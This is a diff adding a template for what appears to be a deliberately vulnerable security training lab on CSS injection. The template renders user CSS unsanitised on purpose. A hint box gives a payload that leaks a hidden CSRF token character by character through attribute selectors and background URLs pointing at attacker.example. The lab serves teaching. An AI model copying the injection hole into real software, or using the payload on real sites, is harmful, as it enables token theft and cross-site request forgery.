@@ -1,0 +1,58 @@
+{% extends 'base.html' %}
+{% block title %}CSS Theme — CSS Injection{% endblock %}
+{% block content %}
+{% if injected and css_in %}
+<style id="injected-theme">{{ css_in | safe }}</style>
+{% endif %}
+<div class="panel">
+  <div class="panel-head">
+    <span class="badge p2">P2</span>
+    <h2>Custom CSS Theme — CSS Injection</h2>
+    <div><span class="mono-dim">CWE-74 · Raw CSS in &lt;style&gt; tag · Attribute selectors exfiltrate CSRF tokens without JS</span></div>
+  </div>
+  <div class="vuln-info">
+    User-supplied CSS is injected directly into a <code>&lt;style&gt;</code> tag with no sanitisation.
+    CSS attribute selectors can target hidden form inputs by value prefix, triggering
+    <code>background-image: url(attacker/log?c=X)</code> requests — exfiltrating secret values
+    one character at a time with <b>zero JavaScript</b>.
+  </div>
+  <div class="hint-box">
+    <b>Exfiltration payload (paste in CSS field):</b>
+    <pre class="result-block">/* Exfiltrate CSRF token — first char 'a' */
+input[name="csrf_token"][value^="a"] {
+  background: url(https://attacker.example/log?c=a);
+}
+input[name="csrf_token"][value^="b"] {
+  background: url(https://attacker.example/log?b=b);
+}
+/* Repeat for all possible chars to enumerate */
+
+/* Malicious style injection — demo */
+.panel { border-color: #ff3366 !important; }</pre>
+    <b>Works even with CSP</b> <code>script-src 'none'</code> if <code>style-src</code> allows inline styles.
+  </div>
+</div>
+{% if preview %}
+<div class="panel">
+  <h2>Injection Analysis</h2>
+  <pre class="result-block">{{ preview | tojson(indent=2) }}</pre>
+</div>
+{% endif %}
+<div class="panel">
+  <h2>Target — Hidden Form with CSRF Token</h2>
+  <form style="padding:12px;background:rgba(0,212,255,.04);border:1px solid var(--hairline);border-radius:var(--r)">
+    <input type="hidden" name="csrf_token" value="csrf-aZ9mKx3bPqR7vY2">
+    <label style="font-size:.78rem;color:var(--dim)">Username</label><br>
+    <input type="text" name="username" value="{{ session.get('username','crew') }}" style="margin:6px 0">
+    <br><button type="button" class="btn">Submit (disabled — demo only)</button>
+  </form>
+</div>
+<div class="panel">
+  <h2>Inject Custom CSS</h2>
+  <form method="POST" class="lab-form">
+    <label>CSS (injected directly into &lt;style&gt; tag — no sanitisation)</label>
+    <textarea name="custom_css" rows="10" class="code-input">{{ css_in | default('.panel { border-top-color: #ff3366; }') | e }}</textarea>
+    <button type="submit" class="btn btn-danger">Inject CSS</button>
+  </form>
+</div>
+{% endblock %}
